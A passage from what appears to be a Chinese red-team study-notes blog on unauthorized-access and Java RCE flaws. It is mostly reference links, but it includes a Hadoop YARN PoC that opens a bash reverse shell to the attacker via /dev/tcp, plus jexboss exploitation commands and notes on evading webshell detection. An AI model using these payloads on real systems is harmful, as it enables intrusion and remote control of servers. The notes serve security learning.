-&gt; &#123;&#125;  error : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, error))</code></pre><hr><h4 id="Memcache"><a href="#Memcache" class="headerlink" title="Memcache"></a>Memcache</h4><p>默认端口11211</p><p>提示连接成功表示漏洞存在</p><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> &lt;target&gt; <span class="hljs-number">11211</span>，或 nc -vv &lt;target&gt; <span class="hljs-number">11211</span></code></pre><p>Memcached端口是对外开放的，用nc或Telne可以直接登录，查看信息，增加修改都可以</p><p>参考</p><ul><li><a href="https://www.cnblogs.com/mrhonest/p/10881389.html">https://www.cnblogs.com/mrhonest/p/10881389.html</a></li></ul><hr><h4 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h4><p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构<br>用户可以在不了解分布式底层细节的情况下，开发分布式程序<br>充分利用集群的威力进行高速运算和存储<br>在默认情况下，Hadoop允许任意用户访问管理接口</p><p>poc:</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span> <span class="hljs-keyword">import</span> requests target = <span class="hljs-string">&#x27;http://127.0.0.1:8088/&#x27;</span>lhost = <span class="hljs-string">&#x27;192.168.220.137&#x27;</span> <span class="hljs-comment"># put your local host ip here, and listen at port 9999</span> url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span>resp = requests.post(url)app_id = resp.json()[<span class="hljs-string">&#x27;application-id&#x27;</span>]url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps&#x27;</span>data = &#123;    <span class="hljs-string">&#x27;application-id&#x27;</span>: app_id,    <span class="hljs-string">&#x27;application-name&#x27;</span>: <span class="hljs-string">&#x27;get-shell&#x27;</span>,    <span class="hljs-string">&#x27;am-container-spec&#x27;</span>: &#123;        <span class="hljs-string">&#x27;commands&#x27;</span>: &#123;            <span class="hljs-string">&#x27;command&#x27;</span>: <span class="hljs-string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,        &#125;,    &#125;,    <span class="hljs-string">&#x27;application-type&#x27;</span>: <span class="hljs-string">&#x27;YARN&#x27;</span>,&#125;requests.post(url, json=data)修改exploit.py中的反弹IPpython exploit.py</code></pre><p>HDFS</p><pre><code class="hljs apache"><span class="hljs-attribute">NameNode</span>默认端口<span class="hljs-number">50070</span> <span class="hljs-attribute">DataNode</span>默认端口<span class="hljs-number">50075</span><span class="hljs-attribute">httpfs</span>默认端口<span class="hljs-number">14000</span><span class="hljs-attribute">journalnode</span>默认端口<span class="hljs-number">8480</span></code></pre><p>YARN （JobTracker ）</p><pre><code class="hljs apache"><span class="hljs-attribute">ResourceManager</span>默认端口<span class="hljs-number">8088</span> <span class="hljs-attribute">Jobtracker</span>默认端口<span class="hljs-number">50030</span> <span class="hljs-attribute">TaskTracker</span>默认端口<span class="hljs-number">50060</span></code></pre><p>Hue默认端口8080</p><p>YARN（JobTracker）</p><pre><code class="hljs crmsh"><span class="hljs-keyword">master</span><span class="hljs-title">默认端口6001</span>regionserver默认端口<span class="hljs-number">60030</span></code></pre><p>hive- server2默认端口1000</p><p>spark- jdbcserver默认端口10003</p><p>开启身份验证，防止未经授权用户访问</p><hr><h4 id="Couchdb"><a href="#Couchdb" class="headerlink" title="Couchdb"></a>Couchdb</h4><p>默认端口5984</p><p>在local.ini配置中：<br>bind_address = 设置为0.0.0.0则存在未授权访问</p><p>直接加端口进行访问即可<br><strong>exp：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/couchdb/</span>CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">12636</span>/exp.py</code></pre><hr><h4 id="Ldap"><a href="#Ldap" class="headerlink" title="Ldap"></a>Ldap</h4><p>使用工具ldap admin直接连接即可</p><p>防御措施：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/mrhonest/</span>p/<span class="hljs-number">10948657</span>.html   --建议https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/u011607971/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">86378361</span>   --管理方法</code></pre><hr><h4 id="JBOSS未授权访问"><a href="#JBOSS未授权访问" class="headerlink" title="JBOSS未授权访问"></a>JBOSS未授权访问</h4><p>vulhub漏洞平台可以复现，启用环境位置：vulhub-jboss-cve-2017-7504</p><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span></code></pre><p>访问8080端口无账号密码就可进入</p><p>linux-kali-exp</p><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/joaomatosf/</span>jexbosscd jexboss python3 jexboss.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.107</span>:<span class="hljs-number">8080</span>/</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/05.png" alt="shell"></p><p>执行工具会依次检测一下项目，有漏洞就会显示红色的: <code>VULNERABLE</code>(易受攻击的)，工具就会根据找到容易受到攻击的点，进行利用</p><p>然后选择<code>YES</code>，就可以获得shell了</p><hr><h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><h4 id="Java下奇怪的命令执行"><a href="#Java下奇怪的命令执行" class="headerlink" title="Java下奇怪的命令执行"></a>Java下奇怪的命令执行</h4><p>参考文章：<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">http://www.lmxspace.com/2019/10/08/Java下奇怪的命令执行/</a></p><hr><h4 id="Shiro反序列化记录"><a href="#Shiro反序列化记录" class="headerlink" title="Shiro反序列化记录"></a>Shiro反序列化记录</h4><p>漏洞搭建安装和复现：</p><ul><li><a href="https://cloud.tencent.com/developer/article/1078421">https://cloud.tencent.com/developer/article/1078421</a></li><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li></ul><p><strong>Reference</strong></p><p>Pwn a CTF Platform with Java JRMP Gadget</p><ul><li><a href="https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li><li><a href="https://open.appscan.io/article-862.html">https://open.appscan.io/article-862.html</a></li><li><a href="https://www.jianshu.com/p/f10ad968e1b2">https://www.jianshu.com/p/f10ad968e1b2</a></li></ul><p>Apache Shiro Java反序列化漏洞分析</p><ul><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li><a href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/</a></li></ul><hr><h4 id="RMI-反序列化"><a href="#RMI-反序列化" class="headerlink" title="RMI-反序列化"></a>RMI-反序列化</h4><p><strong>参考</strong><br><strong>RM官方文档</strong></p><p><a href="https://xz.aliyun.com/t/4711#toc-3">https://xz.aliyun.com/t/4711#toc-3</a>   —浅显易懂的JAVA反序列化入门</p><p>知识盲区，需要脑补！！！！！</p><hr><h4 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h4><p>参考：（哎，知识盲区，加油脑补）</p><ul><li><a href="https://www.freebuf.com/vuls/115849.html">https://www.freebuf.com/vuls/115849.html</a>   –Jndi注入及Spring RCE漏洞分析</li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a>  –在Java中利用JNDI注入</li><li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a>   –如何绕过高版本JDK的限制进行JNDI注入利用</li></ul><p><strong>RPC</strong></p><ul><li><a href="https://www.jianshu.com/p/2accc2840a1b">https://www.jianshu.com/p/2accc2840a1b</a>  –如何给老婆解释什么是RPC</li><li><a href="https://www.freebuf.com/column/189835.html">https://www.freebuf.com/column/189835.html</a>   —深入理解JNDI注入与Java反序列化漏洞利用</li></ul><p><strong>ldap</strong></p><ul><li><a href="https://www.cnblogs.com/wilburxu/p/9174353.html">https://www.cnblogs.com/wilburxu/p/9174353.html</a>   –LDAP概念和原理介绍</li><li><a href="https://www.jianshu.com/p/7e4d99f6baaf">https://www.jianshu.com/p/7e4d99f6baaf</a>   –LDAP入门</li><li><a href="https://blog.csdn.net/caoyujiao520/article/details/82762097">https://blog.csdn.net/caoyujiao520/article/details/82762097</a>  –LDAP入门使用</li></ul><hr><h4 id="fastjson漏洞浅析"><a href="#fastjson漏洞浅析" class="headerlink" title="fastjson漏洞浅析"></a>fastjson漏洞浅析</h4><p><strong>前言</strong></p><p>Fastion是一个Java语言编写的高性能功能完善的JSON库。它采用一种“假定有序快速匹配”的算法，把JS0N Parse的性能提升到极致，是目前Java语言中最快的JSON库。 Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、We输出、 Android客户端等多种应用场景</p><p><strong>参考链接</strong></p><ul><li><a href="https://www.freebuf.com/column/207439.html">https://www.freebuf.com/column/207439.html</a>   —如何绕过高版本JDK的限制进行JNDI注入</li></ul><p>三个fastjson1.2…版本的poc，需要花很多时间来学习！！！</p><hr><h4 id="CVE-2019-11043-PHP远程代码执行复现"><a href="#CVE-2019-11043-PHP远程代码执行复现" class="headerlink" title="CVE-2019-11043 PHP远程代码执行复现"></a>CVE-2019-11043 PHP远程代码执行复现</h4><p><strong>简介</strong></p><p>相信大家都在满天的公众号预警里面看过很多,这里就一笔带过</p><p>2019年10月22日，国外安全研究员公开了一个PHP-FPM远程代码执行的漏洞EXP<br>该漏洞是 Andrew Danau在某比赛解决一道CTF题目时发现，向目标服务器URL发送%0a符号时，服务返回异常发现的漏洞</p><p>2019年9月26日，PHP官方发布漏洞通告其中指出使用 Nginx + php-fpm的服务器在部分配置下存在远程代码执行漏洞且该配置已被广泛使用，危害较大，影响较为广泛相关工具已经公开</p><p><strong>Github地址如下:</strong></p><pre><code class="hljs arcade">https:<span class="hljs-regexp">/github.com/</span>neex/phuip-fpizdam</code></pre><p>方法很多，我会写出来…后补！！！</p><hr><h4 id="java-webshell从入门到入狱系列1-基础篇"><a href="#java-webshell从入门到入狱系列1-基础篇" class="headerlink" title="java webshell从入门到入狱系列1-基础篇"></a>java webshell从入门到入狱系列1-基础篇</h4><p>本系列文章纯探讨技术交流，请勿使用本文探的技术构造恶意webshel非法入侵他人网站</p><p><strong>前言</strong></p><p>本系列，主要从webshell基础、 webshell的bypass技术（关键字、流量层、hook点逃逸）、后渗透的webshell维权（基于容器特性的隐式webshell、内存shell等）等方面和大家交流java中webshe‖的形式</p><p><strong>基础</strong></p><p><strong>java webshell种类</strong></p><p>现在大部分中间件容器，所能支持解析的后缀，主要是jsp，jspx 两种动态脚本为主，比如 tomcat容器中，默认能支持解析的动态脚本已经默认写在配置中了</p><pre><code class="hljs java">&lt;jsp-config&gt; &lt;jsp-property-group&gt; &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt; &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;&lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt; &lt;/jsp-property-group&gt; &lt;/jsp-config&gt;</code></pre><p><strong>在目前常见的 webshel的后门种类,主要分如下几类：</strong></p><p>各种客户端的一句话 webshll （比如菜刀、冰蝎、蚁剑、c刀等常见客户端）、专门负责数据传输的webshell（与数据库进行交互）、Tune后门（基于 socks5协议的 reGeorg之类的）、小马（单纯的进行命令执行、单纯的进行文件管理/上传等功能)、大马（集成了文件管理、命令执行、数据库连接等多功能性大马）</p><p><strong>java执行命令方式</strong></p><p>在这节我们拿最基础的命令执行的来讨论，如何用多种方式写我们的负责命令执行的webshell</p><p>在java中，常见的能够执行命令的方式</p><p>java基础的webshell命令执行方式</p><p><strong>使用 java runtime exec()</strong></p><p>第一种常见的使，用 java.lang.Runtime 类进行执行系统命令，该方法也是目前市面上各种静态查杀 webshell 辅助工具首要盯着的目标，需要注意的是win 下和linux 需要区别对待，以及当使用多个命令组合使用注意坑。下面我们来看看代码。使用 Runtime类，调用exec执行命令返回一个Process对象,然后启一个 BufferedReader类，对返回的结果进行保存回显处理。执行exec的时候需要特别注意，带有|，&lt;，&gt; 等符号的命令需要使用如下代码的方式进行执行，要不然容易出错</p><p>讲解了webshell大部分能利用的机制：<br>Java 执行系统命令的方法和原理<br>用 ProcessBuilder 绕过检测<br>使用 Java 反射机制绕过检测<br>使用 Java 类加载机制绕过检测<br>获得 Class 对象的四种方法</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1180753</span>   --利用Java反射和类加载机制绕过JSP后门检测</code></pre><p>非常详细…</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>javasec.org<span class="hljs-regexp">/javase/</span>   --安全门</code></pre><p><strong>熟悉下Java反射基础：</strong><br>定义：<br>java反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对<br>于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象的功能称为java语言的反射机制</p><p><strong>java反射涉及的类:</strong></p><pre><code class="hljs delphi">cass类：代表类的实体,在运行的Java应用程序中表示类和接口Field类：代表类的成员变量(类的属性)Method类：代表类的方法<span class="hljs-function"><span class="hljs-keyword">Constructor</span>类：代表类的构造方法</span></code></pre><p><strong>Class类中常见使用的</strong><br>1）获取的类中的方法<br>for Name(String className)：根据类名返回类的对象<br>getName()：获得类的完整路径名字</p><p>2）获取类中属性相关</p><p>getFields()：获得所有公有的属性对象<br>getDeclaredFields()：获得所有属性对象(带Declared的可以获取到私有private)</p><p>3）获得类中方法<br>getMethods()：获得该类所有公有的方法<br>getDeclaredMethod( String name, Class…&lt;?&gt; parameterTypes)：获得该类某个方法<br>getDeclaredMethods()：获得该类所有方法</p><p><strong>Fed类常见使用的</strong><br>equals(Object obj)：属性与ob相等则返回true<br>get(Object obj)：获得obj中对应的属性值<br>set(Object obj, Object value)：设置obj中对应属性值</p><p><strong>Method类</strong></p><p>invoke(object obj, Object…args) 传递 object对象及参数调用该对象对应的方法</p><p><strong>Constructor类</strong></p><p>newInstance(Object…initargs)：根据传递的参数创建类的对象</p><hr><h4 id="深究XMLdecoder"><a href="#深究XMLdecoder" class="headerlink" title="深究XMLdecoder"></a>深究XMLdecoder</h4><p>Oracle关于这个 xmldecoder造成的漏洞的CVE编号分别是CVE2017-3506、CVE2017-10271、CVE2019-2725</p><p>最早关于CVE2017-3506的补丁只是根据 object标签进行了限制</p><p>而根据文章中讲解的继承关系 object替换成void即可，它们实际上是不受影响的，因此便出现了CVE-2017-10271，而针对CVE-2017-10271的补丁限定了所有具有执行的节点</p><p>但这次CVE-2019-2725主要是class标签，class标签可代替 object标签来生成对象，因此这次漏洞本质还是 xmldecoder的问题，而补丁也是针对class标签来处理的</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/fnmsd/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">89889144</span>   --fnmsd作者-XMLDecoder解析流程分析https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">180725</span>   ---浅谈Weblogic反序列化——XMLDecoder的绕过史</code></pre><p>盲区，需要脑补！！！！</p><hr><h4 id="FastJson-反序列化学习"><a href="#FastJson-反序列化学习" class="headerlink" title="FastJson 反序列化学习"></a>FastJson 反序列化学习</h4><p>这篇文章总结的非常好：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">06</span><span class="hljs-regexp">/29/</span>FastJson-反序列化学习/</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">fastjson-remote-code-execute-poc：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shengqi158/</span>fastjson-remote-code-execute-pocFastjson <span class="hljs-number">1.2</span>.<span class="hljs-number">24</span>反序列化漏洞分析：https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">178012</span>.htmlFastjson反序列化漏洞研究：https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/mrchang/</span>p/<span class="hljs-number">6789060</span>.htmlFastjson反序列化之TemplatesImpl调用链：https:<span class="hljs-regexp">//</span>p0rz9.github.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">05</span><span class="hljs-regexp">/12/</span>Fastjson反序列化之TemplatesImpl调用链/</code></pre><hr><h4 id="数据库安全思考之xml反序列化"><a href="#数据库安全思考之xml反序列化" class="headerlink" title="数据库安全思考之xml反序列化"></a>数据库安全思考之xml反序列化</h4><p>学习文章非常详细：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587690</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4452199</span></code></pre><p>参考：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>obtruse.syfrtext.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">07</span>/oracle-privilege-escalation-via.html</code></pre><hr><h4 id="Webshell绕安全模式执行命令"><a href="#Webshell绕安全模式执行命令" class="headerlink" title="Webshell绕安全模式执行命令"></a>Webshell绕安全模式执行命令</h4><p>绕过方法总结：</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.<span class="hljs-number">91</span>ri.org/<span class="hljs-number">8700</span>.html</code></pre><p>EXP和poc：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/yangyangwithgnu/</span>bypass_disablefunc_via_ld_preload</code></pre><hr><h4 id="Java-下的XEE漏洞"><a href="#Java-下的XEE漏洞" class="headerlink" title="Java 下的XEE漏洞"></a>Java 下的XEE漏洞</h4><p>该文章讲解了java xml下大部分的XEE漏洞原因和防御：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">10</span><span class="hljs-regexp">/31/</span>Java-XXE-总结/    --详细看看https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">3372</span>    --有多余时间可以看看</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">Java XXE注入修复问题填坑实录:https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>bTeJYzUN9T1u-KDZON5FiQ修不好的洞，JDK的坑——从WxJava XXE注入漏洞中发现了一个对JDK的误会:https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>bTeJYzUN9T1u-KDZON5FiQXML_External_Entity_Prevention_Cheat_Sheet：https:<span class="hljs-regexp">//</span>cheatsheetseries.owasp.org<span class="hljs-regexp">/cheatsheets/</span>XML_External_Entity_Prevention_Cheat_Sheet.html<span class="hljs-comment">#Java</span>一个被广泛流传的XXE漏洞错误修复方案：https:<span class="hljs-regexp">//g</span>v7.me<span class="hljs-regexp">/articles/</span><span class="hljs-number">2019</span><span class="hljs-regexp">/a-widely-circulated-xxe-bug-fix/</span>JAVA常见的XXE漏洞写法和防御：https:<span class="hljs-regexp">//</span>blog.spoock.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">10</span><span class="hljs-regexp">/23/</span>java-xxe/</code></pre><hr><h4 id="Solr-Velocity模板远程代码复现及利用指南"><a href="#Solr-Velocity模板远程代码复现及利用指南" class="headerlink" title="Solr Velocity模板远程代码复现及利用指南"></a>Solr Velocity模板远程代码复现及利用指南</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.secpulse.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">117281</span>.html   --详细复现防御https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/bmjoker/</span>p/<span class="hljs-number">11778478</span>.htmlhttps:<span class="hljs-regexp">//g</span>ovuln.com<span class="hljs-regexp">/topic/</span><span class="hljs-number">501</span>/   --P牛解释</code></pre><hr><h4 id="Solr-RCE-via-Velocity-template"><a href="#Solr-RCE-via-Velocity-template" class="headerlink" title="Solr-RCE-via-Velocity-template"></a>Solr-RCE-via-Velocity-template</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">11</span><span class="hljs-regexp">/03/</span>Solr-RCE-via-Velocity-template/</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">用Intellij idea搭建solr调试环境：https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">4</span>ceeb2c20002http:<span class="hljs-regexp">//</span>lucene.apache.org<span class="hljs-regexp">/solr/gui</span>de<span class="hljs-regexp">/6_6/</span>velocity-response-writer.html</code></pre><hr><h4 id="java-webshell-从入门到入狱系列2-攻防对抗之Bypass-上篇"><a href="#java-webshell-从入门到入狱系列2-攻防对抗之Bypass-上篇" class="headerlink" title="java webshell 从入门到入狱系列2-攻防对抗之Bypass-上篇"></a>java webshell 从入门到入狱系列2-攻防对抗之Bypass-上篇</h4><p>1）java反射bypass</p><p>2）反射的进阶版，通过结合利用byte字节码+反射的方式完全无任何痕迹的反射回显命令执行马</p><p>3）java 后门-unicode编码</p><hr><h4 id="java-webshell-从入门到入狱系列3-攻防对抗之Bypass-中篇"><a href="#java-webshell-从入门到入狱系列3-攻防对抗之Bypass-中篇" class="headerlink" title="java webshell 从入门到入狱系列3-攻防对抗之Bypass-中篇"></a>java webshell 从入门到入狱系列3-攻防对抗之Bypass-中篇</h4><p>其他姿势载入webshell的技巧tip</p><p>JavaWeb 随机后门（远程下载文件）</p><p>Java URLClassLoader 动态加载jar包 webshell</p><p>openrasp （开源应用运行时自我保护）Bypass</p><hr><h4 id="java-webshell-从入门到入狱系列4-攻防对抗之Bypass-下篇"><a href="#java-webshell-从入门到入狱系列4-攻防对抗之Bypass-下篇" class="headerlink" title="java webshell 从入门到入狱系列4-攻防对抗之Bypass-下篇"></a>java webshell 从入门到入狱系列4-攻防对抗之Bypass-下篇</h4><p>各家厂商早期针对流量层查杀 webshel的原理：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6550</span></code></pre><hr><h4 id="Java反序列化过程深究"><a href="#Java反序列化过程深究" class="headerlink" title="Java反序列化过程深究"></a>Java反序列化过程深究</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.sohu.com<span class="hljs-regexp">/a/</span><span class="hljs-number">357066711</span>_257305</code></pre><p>CVE-2017-3248<br>CVE-2017-3248</p><p><strong>防护建议</strong></p><pre><code class="hljs plain">可以在resolveclass和resovleproxyclass增加一些反序列化利用类的黑名单检查</code></pre><hr><h4 id="Apache-Slor不安全配置远程代码执行漏洞复现及jmx-rmi利用分析"><a href="#Apache-Slor不安全配置远程代码执行漏洞复现及jmx-rmi利用分析" class="headerlink" title="Apache Slor不安全配置远程代码执行漏洞复现及jmx rmi利用分析"></a>Apache Slor不安全配置远程代码执行漏洞复现及jmx rmi利用分析</h4><p>CVE-2019-12409</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://wemp.app/posts/<span class="hljs-number">008</span>ae<span class="hljs-number">6</span>ed-<span class="hljs-number">9</span>eee-<span class="hljs-number">4</span>fc<span class="hljs-number">4</span>-<span class="hljs-number">911</span>c-<span class="hljs-number">7</span>c<span class="hljs-number">603</span>c<span class="hljs-number">8</span>b<span class="hljs-number">884</span>a?utm_source=bottom-latest-posts</code></pre><p>该文章详细讲解复现！！！</p><hr><h4 id="java命令执行小细节"><a href="#java命令执行小细节" class="headerlink" title="java命令执行小细节"></a>java命令执行小细节</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.baizhiedu.com<span class="hljs-regexp">/article/</span><span class="hljs-number">1029</span></code></pre><p>学习查看知识点，广告可以忽视！！！</p><hr><h4 id="JDK反序列化Gadgets-7u21"><a href="#JDK反序列化Gadgets-7u21" class="headerlink" title="JDK反序列化Gadgets-7u21"></a>JDK反序列化Gadgets-7u21</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6884</span></code></pre><p>详细，真详细的文章！！</p><p>参考</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">175754</span>.htmlhttps:<span class="hljs-regexp">//</span>b1ue.cn<span class="hljs-regexp">/archives/</span><span class="hljs-number">176</span>.htmlhttps:<span class="hljs-regexp">//gi</span>st.github.com<span class="hljs-regexp">/frohoff/</span><span class="hljs-number">24</span>af7913611f8406eaf3https:<span class="hljs-regexp">//</span>sec.xiaomi.com<span class="hljs-regexp">/article/</span><span class="hljs-number">41</span>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/rickiyang/</span>p/<span class="hljs-number">11336268</span>.html   ---javassist使用全解析</code></pre><hr><h4 id="Weblogic-T3-CVE-2019-2890-Analysis"><a href="#Weblogic-T3-CVE-2019-2890-Analysis" class="headerlink" title="Weblogic-T3-CVE-2019-2890-Analysis"></a>Weblogic-T3-CVE-2019-2890-Analysis</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6904</span></code></pre><p>详细复现！！</p><hr><h4 id="spring-boot-actuators未授权漏洞"><a href="#spring-boot-actuators未授权漏洞" class="headerlink" title="spring-boot-actuators未授权漏洞"></a>spring-boot-actuators未授权漏洞</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">3162</span>ce30a853https:<span class="hljs-regexp">//</span>www.veracode.com<span class="hljs-regexp">/blog/</span>research/exploiting-spring-boot-actuators</code></pre><hr><h4 id="SEMCMS2-6后台文件上传漏洞审计"><a href="#SEMCMS2-6后台文件上传漏洞审计" class="headerlink" title="SEMCMS2.6后台文件上传漏洞审计"></a>SEMCMS2.6后台文件上传漏洞审计</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cesafe.com<span class="hljs-regexp">/html/</span><span class="hljs-number">6190</span>.htmlhttps:<span class="hljs-regexp">//</span>www.yir6.cn<span class="hljs-regexp">/Web/</span><span class="hljs-number">347</span>.html   --Admin/SEMCMS_Upfile.php代码分析</code></pre><hr><h4 id="代码审计之lvyecms后台getshell"><a href="#代码审计之lvyecms后台getshell" class="headerlink" title="代码审计之lvyecms后台getshell"></a>代码审计之lvyecms后台getshell</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.wenwenya.com<span class="hljs-regexp">/anquan/</span><span class="hljs-number">516051</span>.htmlhttps:<span class="hljs-regexp">//</span>webcache.googleusercontent.com<span class="hljs-regexp">/search?q=cache:9JJuN-bvrgwJ:https:/</span><span class="hljs-regexp">/www.secshi.com/</span><span class="hljs-number">22396</span>.html+&amp;cd=<span class="hljs-number">3</span>&amp;hl=zh-CN&amp;ct=clnk&amp;gl=hk</code></pre><hr><h4 id="Log4j-Unserialize-Analysis"><a href="#Log4j-Unserialize-Analysis" class="headerlink" title="Log4j-Unserialize-Analysis"></a>Log4j-Unserialize-Analysis</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7004</span>https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587690</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4452130</span></code></pre><p>两篇文章内容一致！详细介绍了CVE-2019-17571、CVE-2017-5645</p><hr><h4 id="JAVA反序列化-FastJson组件"><a href="#JAVA反序列化-FastJson组件" class="headerlink" title="JAVA反序列化- FastJson组件"></a>JAVA反序列化- FastJson组件</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7027</span></code></pre><p>非常难，内容非常多！！！加油！！！这块比较难</p><hr><h4 id="Spring-securiy-oauth2-CVE-2018-1260"><a href="#Spring-securiy-oauth2-CVE-2018-1260" class="headerlink" title="Spring-securiy-oauth2 (CVE-2018-1260)"></a>Spring-securiy-oauth2 (CVE-2018-1260)</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.spoock.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">05</span><span class="hljs-regexp">/13/</span>cve-<span class="hljs-number">2018</span>-<span class="hljs-number">1260</span>/</code></pre><p>文章内容复现类似，可分析查看…</p><hr><h3 id="WAF-bypass"><a href="#WAF-bypass" class="headerlink" title="WAF-bypass"></a>WAF-bypass</h3><p><img 